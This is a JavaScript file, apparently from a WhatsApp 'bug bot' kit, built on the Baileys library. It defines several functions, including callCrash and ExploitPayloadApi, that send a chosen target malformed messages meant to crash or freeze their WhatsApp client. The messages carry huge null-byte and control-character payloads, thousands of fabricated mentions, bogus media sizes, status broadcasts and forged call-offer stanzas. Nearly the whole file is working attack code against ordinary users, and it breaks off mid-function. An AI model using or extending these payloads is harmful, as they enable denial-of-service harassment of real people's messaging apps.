const crypto = require('crypto')
const fs = require('fs')
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestWaWebVersion,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    generateMessageID,
    downloadContentFromMessage,
    makeCacheableSignalKeyStore,
    makeInMemoryStore,
    jidDecode,
    proto,
    getAggregateVotesInPollMessage,
    getUSyncDevices
} = require("@whiskeysockets/baileys")

/*NO SHARE KEMANAPUN!! 
*/

async function IndicatedFc(sock, target) {

const options = [
    { optionName: "New - Xerovang" },
    { optionName: "X???????????E????????????R????????????O?????????????V?????????????A????????????? ???????????N?????????????G???????????B????????????G???????????Option B" },
    { optionName: "X???????????E????????????R???????????O????????????V?????????????A???????????? ???????????N?????????????G???????????B????????????G????????????" }
];

const correctAnswer = options[1];

const msg = generateWAMessageFromContent(target, {
    botInvokeMessage: {
        message: {
            messageContextInfo: {
                messageSecret: crypto.randomBytes(32), 
                messageAssociation: {
                    associationType: 7,
                    parentMessageKey: crypto.randomBytes(16)
                }
            }, 
            pollCreationMessage: {
                name: "X???????????E????????????R???????????O?????????????V?????????????A????????????? ???????????N?????????????G???????????B????????????G????????????", 
                options: options,
                selectableOptionsCount: 1,
                pollType: "QUIZ",
                correctAnswer: correctAnswer
            }
        }
    }
}, {});

await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
});

await sock.sendMessage(target, {
    document: { url: "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf" },
    fileName: "X???????????E????????????R????????????O?????????????V?????????????A??????????? ???????????N?????????????G???????????B????????????G????????????" + "\0".repeat(1000), // katanya biar fc iclik infinity
    mimetype: "application/pdf",
    caption: "Hello Berikut Paket Pdf Nya Dari - Xerovang" + "\0".repeat(25000),
    contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        businessMessageForwardInfo: {
            businessOwnerJid: target
        },
    },
});

const ButtonXcry = JSON.stringify({
  name: "form_message",
  params: {
    title: "? Form Document",
    description: "Klik untuk membuka form",
    file_name: "data_form.pdf",
    file_size: "245 KB",
    file_type: "PDF"
  }
});


const InteractiveKey = {
    viewOnceMessage: {
        message: {
            interactiveMessage: {
                contextInfo: {
                    isForwarded: true,
                    forwardingScore: 999,
                    businessMessageForwardInfo: {
                        businessOwnerJid: target
                    },
                },
                body: {
                    text: "Xerovang - Infinite Experiment"
                },
                nativeFlowMessage: {
                    messageParamsJson: "\0".repeat(5000),
                    buttons: [
                        {
                            name: "single_select",
                            buttonParamsJson: "\0"
                        },
                        {
                            name: "form_message",
                            buttonParamsJson: ButtonXcry
                        },
                    ],
                },
            },
        },
    },
};

const messaging = await generateWAMessageFromContent(target, InteractiveKey, {});

await sock.relayMessage(target, messaging.message, {
    messageId: messaging.key.id
}, {});
}

async function DelayDuration(sock, jid) {
  try {
  let bool = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;
  if (11 > 9) {
    bool = bool ? false : true;
  }
    const integer = 1998;
    let cards = [];
    let parse = true;
    let unsign = false;
    const MetaMention = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: integer }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
  let callId = (await crypto.randomBytes(16)).toString("hex");
  let audio16000 = { tag: 'audio', attrs: { enc: 'opus', rate: '16000' } };
  let audio8000 = { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } };
  let net = { tag: 'net', attrs: { medium: '3' }, content: '3' };
  let capability = { tag: 'capability', attrs: { ver: '1' }, content: 'AAAAAA==' };
  let encopt = { tag: 'encopt', attrs: { keygen: '2' } };
  let offerContent = [audio16000, audio8000, net, capability, encopt];

  const generateRandomJids = (maxSize) => {
    const jids = [];
    let currentSize = 0;
    while (currentSize < maxSize - 25) {
      const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
      const jid = `91${randomNumber}@s.whatsapp.net`;
      jids.push(jid);
      currentSize += jid.length + 3;
    }
    return jids;
  };

  const maxSize = 1074689;
  const jids = generateRandomJids(maxSize);
   
 for (let i = 0; i < 1000; i++) {
 cards.push({
  body: {
    text: ""
  },
  header: {
   title: "",
   imageMessage: {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
     mimetype: "image/jpeg",
     fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
     fileLength: "999999999999999999",
     height: 9999,
     width: 9999,
     mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
     fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
     directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
     mediaKeyTimestamp: "1737281900",
     jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
      scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
      scanLengths: [3537, 10557, 1905, 2353],
      midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
       },
       hasMediaAttachment: parse
     },
     nativeFlowMessage: {
       messageParamsJson: "",
       buttons: [{
         name: "address_message",
         buttonParamsJson: {}
       }]
     }
  });
 }
 
 let msgCrl = await generateWAMessageFromContent(jid, {
   viewOnceMessage: {
     message: {
       messageContextInfo: { deviceListMetada: {}, deviceListMetadaVersion: 2 },
       interactiveMessage: {
         body: { text: "@popyeyeye" },
         carouselMessage: { cards: cards },
         contextInfo: { participant: jid },
       },
     },
   },
 }, {});
 
 await sock.relayMessage("status@broadcast", msgCrl.message, {
     messageId: msgCrl.key.id,
     statusJidList: [jid],
     additionalNodes: [{
       tag: "meta", attrs: {}, content: [{
         tag: "mentioned_users", attrs: {}, content: [{
           tag: "to", attrs: { jid: jid }, content: undefined
         }],
       }],
     }],
   });
 
 await new Promise((r) => setTimeout(r, 5000));
 
 let msgAudio = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999999999,
            seconds: 9999999999999999999,
            ptt: parse,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 1900 }, () =>
                            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                        )
                    ],
              isForwarded: parse,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "X"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

 const msg = generateWAMessageFromContent(jid, audioMessage, {});

 await sock.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
     statusJidList: [jid],
     additionalNodes: [{
       tag: "meta", attrs: {}, content: [{
         tag: "mentioned_users", attrs: {}, content: [{
           tag: "to", attrs: { jid: jid }, content: undefined
         }],
       }],
     }],
   });

 for (let i = 0; i < 1000; i++) {
   await new Promise((r) => setTimeout(r, 5000));
      let msgExt = await generateWAMessageFromContent(jid, {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "696969696969@s.whatsapp.net",
            mentionedJid: MetaMention,
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
            fromMe: unsign,
            isForwarded: parse,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: jid
            },
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "@popyeyeye - New",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "review_and_pay",
                      paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"ExoticsX\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                      version: 3
                    }
                  }
                }
              }
            }
          },
        },
      }, {});
      
  let stcMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: 99999999999999,
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: jid,
            mentionedJid: MetaMention,
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: bool,
          },
          isAvatar: bool,
          isAiSticker: bool,
          isLottie: bool,
        },
      },
    },
  };
  
  const msgStc = generateWAMessageFromContent(jid, stcMsg, {});
  
   await sock.relayMessage("status@broadcast", msgStc.message, {
      messageId: msgStc.key.id, statusJidList: [jid], additionalNodes: [{
          tag: "meta", attrs: {}, content: [{
            tag: "mentioned_users", attrs: {}, content: [{
              tag: 'offer', attrs: { 'call-id': callId, 'call-creator': '696969696969@s.whatsapp.net', 'timestamp': Date.now().toString()
                }, content: offerContent
            }],
          }],
        }],
      });
    }
   } catch (error) {
    console.error("error jir:", error.message)
   }
 }

async function FcLeoPayx(sock, target) {
  const Hfc = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "???��Im X? E?R ??O.??" },
          nativeFlowMessage: {
            buttons: [
              { 
                name: "single_select", 
                buttonParamsJson: "\r" 
              },
              { 
                name: "form_message",
                buttonParamsJson: JSON.stringify({
                  icon: "REVIEW",
                  flow_cta: "LeoVhal?",
                  flow_message_version: "3"
                })
              }
            ]
          }
        }
      }
    }
  };
  
  await sock.relayMessage(target, Hfc, {
    messageId: null,
    participant: { jid: target },
    userJid: target,
  });
  
  let ExoticsZ = "?".repeat(1500);
  const ZyrexPay = {
    requestPaymentMessage: {
      currencyCodeIso4217: 'DOLAR',
      requestFrom: target, 
      expiryTimestamp: Date.now() + 8000, 
      amount: {
        value: 999999999, 
        offset: 100, 
        currencyCode: 'IDR'
      },
      contextInfo: {
        externalAdReply: {
          title: "?????",
          body: ExoticsZ,
          mimetype: 'audio/mpeg',
          caption: ExoticsZ,
          showAdAttribution: true,
          sourceUrl: 'https://t.me/Leosikmaboy',
          thumbnailUrl: 'https://files.catbox.moe/shnmho.jpg'
        }
      }
    }
  };
  
  await sock.relayMessage(target, ZyrexPay, {
    participant: { jid: target },
    messageId: null,
    userJid: target,
    quoted: null
  });
  
  console.log(chalk.red.bold("Succes Sending Bug Fc")); 
}

async function FcLolipop(sock, target) {
  const {
    encodeSignedDeviceIdentity,
    jidEncode,
    jidDecode,
    encodeWAMessage,
    patchMessageBeforeSending,
    encodeNewsletterMessage
  } = require("@whiskeysockets/baileys");

  let devices = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

  await sock.assertSessions(devices);

  let xnxx = () => {
    let map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => {
          try { await prev; } catch {}
          return fn();
        })(map[key].task);
        return map[key].task;
      }
    };
  };

  let permen = xnxx();
  let Official = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let XMods = sock.createParticipantNodes.bind(sock);
  let Cyber = sock.encodeWAMessage?.bind(sock);

  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
    if (!recipientJids.length)
      return { nodes: [], shouldIncludeDeviceIdentity: false };

    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

    let memeg = Array.isArray(patched)
      ? patched
      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    let { id: meId, lid: meLid } = sock.authState.creds.me;
    let omak = meLid ? jidDecode(meLid)?.user : null;
    let shouldIncludeDeviceIdentity = false;

    let nodes = await Promise.all(
      memeg.map(async ({ recipientJid: jid, message: msg }) => {
        let { user: targetUser } = jidDecode(jid);
        let { user: ownPnUser } = jidDecode(meId);

        let isOwnUser = targetUser === ownPnUser || targetUser === omak;
        let y = jid === meId || jid === meLid;

        if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

        let bytes = Official(Cyber ? Cyber(msg) : encodeWAMessage(msg));

        return permen.mutex(jid, async () => {
          let { type, ciphertext } = await sock.signalRepository.encryptMessage({
            jid,
            data: bytes
          });

          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

          return {
            tag: 'to',
            attrs: { jid },
            content: [
              {
                tag: 'enc',
                attrs: { v: '2', type, ...extraAttrs },
                content: ciphertext
              }
            ]
          };
        });
      })
    );

    return {
      nodes: nodes.filter(Boolean),
      shouldIncludeDeviceIdentity
    };
  };

  let Exo = crypto.randomBytes(32);
  let Floods = Buffer.concat([Exo, Buffer.alloc(8, 0x01)]);

  let {
    nodes: destinations,
    shouldIncludeDeviceIdentity
  } = await sock.createParticipantNodes(
    devices,
    { conversation: "y" },
    { count: '0' }
  );

  let lemiting = {
    tag: "call",
    attrs: {
      to: target,
      id: sock.generateMessageTag(),
      from: sock.user.id
    },
    content: [
      {
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
          "call-creator": sock.user.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          {
            tag: "video",
            attrs: {
              orientation: "0",
              screen_width: "1920",
              screen_height: "1080",
              device_orientation: "0",
              enc: "vp8",
              dec: "vp8"
            }
          },
          { tag: "net", attrs: { medium: "3" } },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations },
          ...(shouldIncludeDeviceIdentity
            ? [
                {
                  tag: "device-identity",
                  attrs: {},
                  content: encodeSignedDeviceIdentity(
                    sock.authState.creds.account,
                    true
                  )
                }
              ]
            : [])
        ]
      }
    ]
  };

  await sock.sendNode(lemiting);
}

async function callCrash(sock, target, isVideo = false) {
  const { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@whiskeysockets/baileys");
  
  try {
    const devices = (
      await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    const createMutex = () => {
      const locks = new Map();
      
      return {
        async mutex(key, fn) {
          while (locks.has(key)) {
            await locks.get(key);
          }
          
          const lock = Promise.resolve().then(() => fn());
          locks.set(key, lock);
          
          try {
            const result = await lock;
            return result;
          } finally {
            locks.delete(key);
          }
        }
      };
    };

    const mutexManager = createMutex();
    
    const appendBufferMarker = (buffer) => {
      const newBuffer = Buffer.alloc(buffer.length + 8);
      buffer.copy(newBuffer);
      newBuffer.fill(1, buffer.length);
      return newBuffer;
    };

    const originalCreateParticipantNodes = sock.createParticipantNodes?.bind(sock);
    const originalEncodeWAMessage = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) {
        return {
          nodes: [],
          shouldIncludeDeviceIdentity: false
        };
      }

      const processedMessage = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      
      const messagePairs = Array.isArray(processedMessage) 
        ? processedMessage 
        : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }));

      const { id: meId, lid: meLid } = sock.authState.creds.me;
      const localUser = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(
        messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
          const { user: targetUser } = jidDecode(jid);
          const { user: ownUser } = jidDecode(meId);
          const isOwnUser = targetUser === ownUser || targetUser === localUser;
          const isSelf = jid === meId || jid === meLid;
          
          if (dsmMessage && isOwnUser && !isSelf) {
            msg = dsmMessage;
          }

          const encodedBytes = appendBufferMarker(
            originalEncodeWAMessage 
              ? originalEncodeWAMessage(msg) 
              : encodeWAMessage(msg)
          );

          return mutexManager.mutex(jid, async () => {
            const { type, ciphertext } = await sock.signalRepository.encryptMessage({ 
              jid, 
              data: encodedBytes 
            });
            
            if (type === 'pkmsg') {
              shouldIncludeDeviceIdentity = true;
            }
            
            return {
              tag: 'to',
              attrs: { jid },
              content: [{
                tag: 'enc',
                attrs: {
                  v: '2',
                  type,
                  ...extraAttrs
                },
                content: ciphertext
              }]
            };
          });
        })
      );

      return {
        nodes: nodes.filter(Boolean),
        shouldIncludeDeviceIdentity
      };
    };

    const callKey = crypto.randomBytes(32);
    const extendedCallKey = Buffer.concat([callKey, Buffer.alloc(8, 0x01)]);
    const callId = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();

    const { nodes: destinations, shouldIncludeDeviceIdentity } = 
      await sock.createParticipantNodes(devices, { 
        conversation: "call-initiated"
      }, { count: '0' });

    const callStanza = {
      tag: "call",
      attrs: {
        to: target,
        id: sock.generateMessageTag(),
        from: sock.user.id
      },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": callId,
          "call-creator": sock.user.id
        },
        content: [
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "16000"
            }
          },
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "8000"
            }
          },
          ...(isVideo ? [{
            tag: 'video',
            attrs: {
              enc: 'vp8',
              dec: 'vp8',
              orientation: '0',
              screen_width: '1920',
              screen_height: '1080',
              device_orientation: '0'
            }
          }] : []),
          {
            tag: "net",
            attrs: {
              medium: "3"
            }
          },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          {
            tag: "encopt",
            attrs: { keygen: "2" }
          },
          {
            tag: "destination",
            attrs: {},
            content: destinations
          },
          ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
          }] : [])
        ].filter(Boolean)
      }]
    };

    await sock.sendNode(callStanza);

  } catch (error) {
    console.error('Error in callCrash:', error);
    throw error;
  }
}

async function exoticsIPV2(sock, isTarget) {
  try {
    const msg = generateWAMessageFromContent(isTarget, {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -66.666,
            degreesLongtitude: 66.666,
            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            jpegThumbnail: null,
            url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(25000)}`,
            contextInfo: {
              participant: isTarget,
              forwardingScore: 1,
              isForwarded: true,
              stanzaId: isTarget,
              mentionedJid: [isTarget]
            },
          },
        },
      },
    }, {});
    
   await sock.relayMessage(isTarget, {
     requestPhoneNumberMessage: {
      contextInfo: {
       quotedMessage: {
        documentMessage: {
         url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
         mimetype: "application/pdf",
         fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
         fileLength: 0,
         pageCount: 0,
         mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
         fileName: "ven.pdf",
         fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
         directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1737369406,
          caption: "raven kill your ios",
          title: "@rvnn6",
          mentionedJid: [isTarget],
          }
        },
        externalAdReply: {
         title: "apasi ven?",
         body: "𑇂𑆵𑆴𑆿".repeat(30000),
         mediaType: "VIDEO",
         renderLargerThumbnail: true,
         sourceUrl: "https://t.me/rvnn6",
         mediaUrl: "https://t.me/rvnn6",
         containsAutoReply: true,
         renderLargerThumbnail: true,
         showAdAttribution: true,
         ctwaClid: "ctwa_clid_example",
         ref: "ref_example"
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
          contentType: "UPDATE",
        },
      },
     skipType: 7,
    }
  }, {
   participant: { jid: isTarget }
 });
 
  await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [isTarget],
      additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: isTarget }, content: undefined
          }],
        }],
      }],
    });
  } catch (error) {
    console.log(error);
  }
}

async function ExploitPayloadApi(isTarget, ptcp = true) {
  const generateMasifJids = (length) => Array.from({ length }, () =>
    `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
);
  const mentionedJidBase = ["0@s.whatsapp.net", ...generateMasifJids(1900)];
  const mentionedJidSuperMasif = generateMasifJids(1900 + 1950);
  const largeEmptyJson = "\u0000".repeat(1045000);
  const largeControlCharJson = "\x10".repeat(1045000);
  
  const VidMessage = generateWAMessageFromContent(isTarget, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileLength: "289511", seconds: 15, caption: "\n", height: 640, width: 640,
      contextInfo: {
        isSampled: true, participant: isTarget,
        mentionedJid: mentionedJidBase,
        remoteJid: "X", forwardingScore: 100, isForwarded: true,
        quotedMessage: { businessMessageForwardInfo: { businessOwnerJid: "0@s.whatsapp.net" } },
      },
    },
    }, 
    { ephemeralExpiration: 0, forwardingScore: 9741, isForwarded: true }
  );
  await sock.relayMessage(isTarget, {
    groupStatusMessageV2: { message: VidMessage.message },
    }, ptcp ? 
    { messageId: VidMessage.key.id, participant: { jid: isTarget } } : { messageId: VidMessage.key.id }
  );
    
  const Msg1 = await generateWAMessageFromContent(isTarget, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "FLOWX :: 404.ΣXΣ", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: largeEmptyJson,
              version: 3
            },
            contextInfo: { mentionedJid: mentionedJidBase } 
          }
        }
      }
  }, {});
  await sock.relayMessage(isTarget, {
      groupStatusMessageV2: { message: Msg1.message },
      }, ptcp ? 
      { messageId: Msg1.key.id, participant: { jid: isTarget } } : { messageId: Msg1.key.id }
  );

  const Msg2 = generateWAMessageFromContent(isTarget, {
      viewOnceMessage: {
          message: {
              interactiveResponseMessage: {
                  body: { text: "FLOWX :: 404.ΣXΣ", format: "DEFAULT" },
                  nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: largeEmptyJson, 
                      version: 3
                  },
                 entryPointConversionSource: "call_permission_request",
              }
          }
      }
  }, { ephemeralExpiration: 0, forwardingScore: 9741, isForwarded: true, });
  await sock.relayMessage(isTarget, {
      groupStatusMessageV2: { message: Msg2.message },
      }, ptcp ? 
      { messageId: Msg2.key.id, participant: { jid: isTarget } } : { messageId: Msg2.key.id }
  );
  
  const Msg3 = await generateWAMessageFromContent(isTarget, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "FLOWX :: 404.ΣXΣ", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: largeControlCharJson, 
              version: 3
            },
            entryPointConversionSource: "galaxy_message"
          }
        }
      }
  }, { ephemeralExpiration: 0, forwardingScore: 9741, isForwarded: true, });
  await sock.relayMessage(isTarget, {
      groupStatusMessageV2: { message: Msg3.message },
      }, ptcp ? 
      { messageId: Msg3.key.id, participant: { jid: isTarget } } : { messageId: Msg3.key.id }
  );

  const payload = generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "MΣXX :: 404.ΣXΣ", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: largeControlCharJson,
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    { ephemeralExpiration: 0, forwardingScore: 9741, isForwarded: true }
  );
  await sock.relayMessage(isTarget, {
    groupStatusMessageV2: { message: payload.message },
    }, ptcp ? 
    { messageId: payload.key.id, participant: { jid: isTarget } } : { messageId: payload.key.id }
  );
  
  const payload2 = generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "\n", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: largeControlCharJson,
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    { ephemeralExpiration: 0, forwardingScore: 9741, isForwarded: true }
  );
  await sock.relayMessage(isTarget, {
    groupStatusMessageV2: { message: payload2.message },
    }, ptcp ? 
    { messageId: payload2.key.id, participant: { jid: isTarget } } : { messageId: payload2.key.id }
  );

  const Msg4 = generateWAMessageFromContent(isTarget, {
      stickerMessage: {
